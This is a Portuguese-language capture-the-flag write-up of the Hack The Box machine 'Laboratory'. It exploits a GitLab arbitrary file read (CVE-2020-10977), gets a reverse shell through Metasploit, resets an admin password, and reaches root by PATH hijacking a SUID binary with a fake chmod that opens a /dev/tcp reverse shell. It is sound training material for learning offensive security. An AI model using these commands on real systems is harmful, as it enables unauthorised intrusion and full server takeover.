---
layout: single
title: "Hackthebox write-up: Laboratory"
namespace: htb-laboratory
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-04-17 16:00:00
header:
   teaser: https://i.imgur.com/t7eWqy0.png
---

Olá pessoal!

A máquina desta semana será **Laboratory**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xc45](https://app.hackthebox.eu/users/73268). <!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
{: .notice--info}

![HTB Laboratory](https://i.imgur.com/6fqKuas.png){: .align-center}

## Enumeração

Conforme de costume, iniciamos com a enumeração básica dos serviços utilizando o `nmap` com um quick scan:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.216                                                                   
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 15:50 -03
Nmap scan report for 10.10.10.216
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.96 seconds
```

Após execução notamos que existem, além do serviço de SSH, dois serviços HTTP (HTTP e HTTPs em suas respectivas portas padrão) que fazem menção às entradas de DNS `laboratory.htb` e `git.laboratory.htb`, os quais foram incluidos no arquivo hosts da máquina para melhor enumeração destes serviços.

### 80/TCP - Serviço HTTP

Uma vez acessado serviço HTTP tanto no IP quanto em qualquer um dos DNS que pudemos observar de acordo com o scan do `nmap`, ocorre um redirecionamento para o HTTPS, que funciona na porta 443/TCP, que será discutido a seguir.

### 443/TCP - Serviço HTTPS

Ao enumerar os serviços HTTPS em ambos os DNS, pudemos notar algumas diferenças nos serviços publicados.

### `https://laboratory.htb`

Ao navegar para a página `https://laboratory.htb`, temos um site institucional relacionado a uma empresa de segurança com Dexter, Dee Dee e Anonymous como funcionários, porém nenhum link interessante para dar continuidade na exploração.

![laboratory htb](https://i.imgur.com/Fowr3Hn.png){: .align-center}

#### Gobuster

Para verificar se alguma outra página existe neste website, realizei o scan utilizando o `gobuster` porém nada interessante foi encontrado.

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://laboratory.htb -x html,php,txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/02/18 16:12:44 Starting gobuster
===============================================================
/images (Status: 301)
/index.html (Status: 200)
/assets (Status: 301)
/CREDITS.txt (Status: 200)
Progress: 38301 / 220561 (17.37%)
```

### `https://git.laboratory.htb`

Uma vez acessado o serviço, notado que se tratava de um servidor [GitLab](https://about.gitlab.com/), conforme podemos ver na imagem abaixo.

![gitab laboratory htb](https://i.imgur.com/dL6VMKv.png){: .align-center}

Após algumas pesquisas, notei que na API V3 seria possivel realizar algumas enumerações não autenticadas, o que não foi possível neste caso, já que neste caso temos uma API V4.

```bash
$ curl -L https://git.laboratory.htb/api/v3/internal/check -k                                               
{"error":"API V3 is no longer supported. Use API V4 instead."}                                           
                                                                    
$ curl -L https://git.laboratory.htb/api/v4/internal/check -k                                               
{"message":"401 Unauthorized"}
```

Já que a enumeração via métodos encontrados em outros artigos também não funcionou, segui para a criação de uma conta, para qual foi requerido o uso de uma conta de um domínio autorizado (*laboratory.htb*) mas que mesmo assim foi criada com sucesso.

Uma vez logado com a conta recém-criada, segui para a exploração dos repositórios públicos, onde encontrei um repositório chamado **SecureWebSite**.

![gitlab projects](https://i.imgur.com/2FARHEv.png){: .align-center}

Ao navegar no repositório, pude notar de que se tratava do site publicado na URL `https://laboratory.htb`, de onde poderíamos obter alguma informação interessante, porém conforme já era esperado se trata apenas de um single page application sem funcionalidades que pudéssemos explorar.

Entretanto, uma vez logado no portal, ao acessar o menu *Help > Help* podemos identificar a versão do GitLab em execução, que é a 12.8.1 Community

![gitlab version](https://i.imgur.com/ygc0H7j.png){: .align-center}

Buscando no `searchsploit` encontradas algumas vulnerabilidades que poderiam ser exploradas, identificadas como **Arbitrary File Read**.

```bash
$ searchsploit gitlab
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
GitLab - 'impersonate' Feature Privilege Escalation                    | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE (Authenticated)                                    | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution                                  | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution (Authenticated)                  | ruby/webapps/49263.py
GitLab 12.9.0 - Arbitrary File Read                                    | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                    | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                           | php/webapps/30329.sh
Gitlab-shell - Code Execution (Metasploit)                             | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting      | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution        | json/webapps/47420.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Após algumas tentativas com os scripts do searchsploit não obtive o sucesso esperado. Em nova busca acabei encontrando o [CVE-2020-10977 no MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10977) que está relacionado à esta vulnerabilidade e, a partir desta informação, encontrei outros exploits a serem testados, sendo o disponível no repositório [thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com)](https://github.com/thewhiteh4t/cve-2020-10977) o utilizado.

Com este script, pude confirmar que o servidor continua vulnerável à exploração conforme possibilidade de obter o arquivo `/etc/passwd`.

```bash
$ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                   
----------------------------------                                                                       
--- CVE-2020-10977 ---------------       
--- GitLab Arbitrary File Read ---               
--- 12.9.0 & Below ---------------    
----------------------------------                                                                       
                                                                                                         
[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]
                                                                                                         
[+] Target        : https://git.laboratory.htb                                                           
[+] Username      : dummy                                                                                
[+] Password      : P@ssw0rd
[+] Project Names : ProjectOne, ProjectTwo

[!] Trying to Login...         
[+] Login Successful!
[!] Creating ProjectOne...
[+] ProjectOne Created Successfully!
[!] Creating ProjectTwo...
[+] ProjectTwo Created Successfully!
[>] Absolute Path to File : /etc/passwd
[!] Creating an Issue...
[+] Issue Created Successfully!
[!] Moving Issue...
[+] Issue Moved Successfully!
[+] File URL : https://git.laboratory.htb/dummy/ProjectTwo/uploads/09bddb24c9ac93d1a011f6ed14054a66/passwd

> /etc/passwd
```

Verificando o conteúdo do `/etc/passwd` podemos notar que os usuários desta máquina, além de *root* e *ssh* foram criados e utilizam basicamente a mesma raiz de diretório em `/var/opt/gitlab`, onde vamos buscar por arquivos interessantes

```bash
$ cat etc_passwd | grep sh | awk -F":" '{print $6","$1}'
/root,root
/var/run/sshd,sshd
/var/opt/gitlab,git
/var/opt/gitlab/postgresql,gitlab-psql
/var/opt/gitlab/mattermost,mattermost
/var/opt/gitlab/registry,registry
/var/opt/gitlab/prometheus,gitlab-prometheus
/var/opt/gitlab/consul,gitlab-consul
```

## Initial Foothold

Já sabendo das contas da máquina e da possibilidade de leitura de arquivos arbitrários, pesquisei sobre como converter essa possibilidade em RCE, para assim obter um shell reverso. Após algumas leituras encontrei [um módulo do Metasploit](https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/) que se utiliza desta mesma vulnerabilidade para obter o `secret_key_base` do GitLab, e assim, com uma chamada de deserialization do cookie emitido, obter um shell reverso com a conta **git**.

```bash
msf6 exploit(multi/http/gitlab_file_read_rce) > run

[*] Started reverse TCP handler on 10.10.10.10:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
[*] Logged in to user jdoe
[*] Created project /jdoe/vWL4JJIQ
[*] Created project /jdoe/NVfFvw3v
[*] Created issue /jdoe/vWL4JJIQ/issues/1
[*] Executing arbitrary file load
[+] File saved as: '/home/zurc/.msf4/loot/20210219090516_default_10.10.10.216_gitlab.secrets_242811.txt'
[+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
[*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
[*] Attempting to delete project /jdoe/vWL4JJIQ
[*] Deleted project /jdoe/vWL4JJIQ
[*] Attempting to delete project /jdoe/NVfFvw3v
[*] Deleted project /jdoe/NVfFvw3v
[*] Command shell session 1 opened (10.10.10.10:4444 -> 10.10.10.216:35138) at 2021-02-19 09:05:22 -0300

id
uid=998(git) gid=998(git) groups=998(git)
```

## User flag

Com acesso à máquina iniciada enumeração utilizando o `linpeas.sh` do [PEAS Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md) que me ajudou muito a entender as possibilidades de exploração do GitLab, uma vez que não conheço bem a implementação do serviço. O Script detecta o serviço instalado e trouxe algumas informações interessantes sobre a máquina em questão:

- Enumeração das contas, onde pudemos notar que o usuário **dexter** (admin@example.com) é administrador.
- Execução dentro de um docker container, onde futuramente precisaremos escapá-lo para a máquina de fato.

Um dos pontos colocados pelo `linpeas.sh` durante a enumeração é a possibilidade de alterar a senha de qualquer usuário, o que tivemos sucesso a partir da execução dos comandos abaixo:

```bash
git@git:~/gitlab-rails$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> user = User.find_by(email: "admin@example.com")
=> #<User id:1 @dexter>
irb(main):002:0> user.password = "P@ssw0rd"
=> "P@ssw0rd"
irb(main):003:0> user.password_confirmation = "P@ssw0rd"
=> "P@ssw0rd"
irb(main):004:0> user.save!
Enqueued ActionMailer::DeliveryJob (Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007fa424ee0668 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
irb(main):005:0> 
```

Após alterada a senha, foi possível visualizar para a conta `dexter` um repositório privado adicional chamado **SecureDocker**.

![gitlab dexter projects](https://i.imgur.com/oXJEKFR.png){: .align-center}

Já que temos acesso ao código-fonte do repositório, notado que existem alguns scripts e **chave SSH** do usuário dexter, conforme mencionado na descrição do repositório.

> CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I'll figure that out later.

Após clonar o repositório para máquina local observados os seguintes arquivos.

```bash
$ git -c http.sslVerify=false clone http://git.laboratory.htb/dexter/securedocker.git  
Cloning into 'securedocker'...
Username for 'https://git.laboratory.htb': dexter
Password for 'https://dexter@git.laboratory.htb': 
warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), done.
```

```bash
$ tree -a -I '.git'
.
├── create_gitlab.sh
├── dexter
│   ├── recipe.url
│   ├── .ssh
│   │   ├── authorized_keys
│   │   └── id_rsa
│   └── todo.txt
└── README.md

2 directories, 6 files
```

Assim como na máquina [Luanne]({% post_url 2021-03-27-htb-luanne %}), realizado a conversão da chave para RSA, utilizando os comandos abaixo:

```bash
$ chmod 600 id_rsa
$ ssh-keygen -p -m PEM -f ./id_rsa
Key has comment 'root@laboratory'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
```

Após o procedimento mencionado, foi possível conectar-se à máquina via SSH e obter a flag a partir do usuário `dexter`.

  ```bash
  $ ssh -i id_rsa dexter@10.10.10.216
  dexter@laboratory:~$ ls -la
  total 40
  drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 .
  drwxr-xr-x 3 root   root   4096 Jun 26  2020 ..
  lrwxrwxrwx 1 root   root      9 Jul 17  2020 .bash_history -> /dev/null
  -rw-r--r-- 1 dexter dexter  220 Feb 25  2020 .bash_logout
  -rw-r--r-- 1 dexter dexter 3771 Feb 25  2020 .bashrc
  drwx------ 2 dexter dexter 4096 Jun 26  2020 .cache
  drwx------ 2 dexter dexter 4096 Oct 22 08:14 .gnupg
  drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local
  -rw-r--r-- 1 dexter dexter  807 Feb 25  2020 .profile
  drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh
  -r--r----- 1 root   dexter   33 Feb 19 11:06 user.txt
  dexter@laboratory:~$ cat user.txt 
  <redacted>
  ```

## Root flag

Após executar `linpeas.sh` novamente, desta vez na máquina de fato, notei que existe um arquivo SUID, com permissão atribuida para o usuário **dexter**.

```bash
dexter@laboratory:~$ ls -la /usr/local/bin/docker-security
-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security
```

Ao executar este binário, não observei nenhum output, assim como não exibe nenhum tipo de informação/ajuda usando parametros como `--version` e `--help`. Analisando o mesmo mais a fundo notei que se trata de um arquivo executável, o qual pode conter alguma informação do que se utiliza para algum eventual path hijack ou buffer overflow.

```bash
dexter@laboratory:~$ file /usr/local/bin/docker-security
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
```

Antes de utilizar ferramentas de disassembly, inspecionado as strings do arquivo a partir da máquina atacante (uma vez que a máquina não possui o binário `strings`) e algumas entradas chamaram a atenção, sendo elas a chamada do binário `chmod` para redefinir as permissões no diretório docker, porém sem especificar o caminho completo. Isso implica que este app **é vulnerável *path hijacking***.

```bash
$ strings docker-security
[...]

[]A\A]A^A_
chmod 700 /usr/bin/docker
chmod 660 /var/run/docker.sock
;*3$"
GCC: (Debian 10.1.0-6) 10.1.0

[...]
```

### Path hijack

Para obter privilégios de `root`, uma vez que o binário que possui SUID é vulnerável, o primeiro passo é criar um `chmod` **falso**, neste caso gerando um shell reverso, seguido da alteração do PATH para que o caminho onde o arquivo localizado seja buscado no início da execução.

```bash
dexter@laboratory:~$ echo '#!/bin/bash' > /dev/shm/chmod
dexter@laboratory:~$ echo 'bash -i >& /dev/tcp/10.10.10.10/4443 0>&1' >> /dev/shm/chmod
dexter@laboratory:~$ chmod +x /dev/shm/chmod
dexter@laboratory:~$ PATH=/dev/shm:$PATH
dexter@laboratory:~$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

Após configurar um listener na porta especificada (`nc -lnvp 4443`) executado o binário `docker-security` o que retornou um shell reverso com privilégios de **root**, permitindo assim a obtenção da flag.

```bash
$ nc -lnvp 4443                                                                                             
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.216] 44754
root@laboratory:~# id  
id
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
root@laboratory:~# cat /root/root.txt
cat /root/root.txt
<redacted>
```

Espero que tenham gostado!

Vejo vocês novamente em breve! :smiley: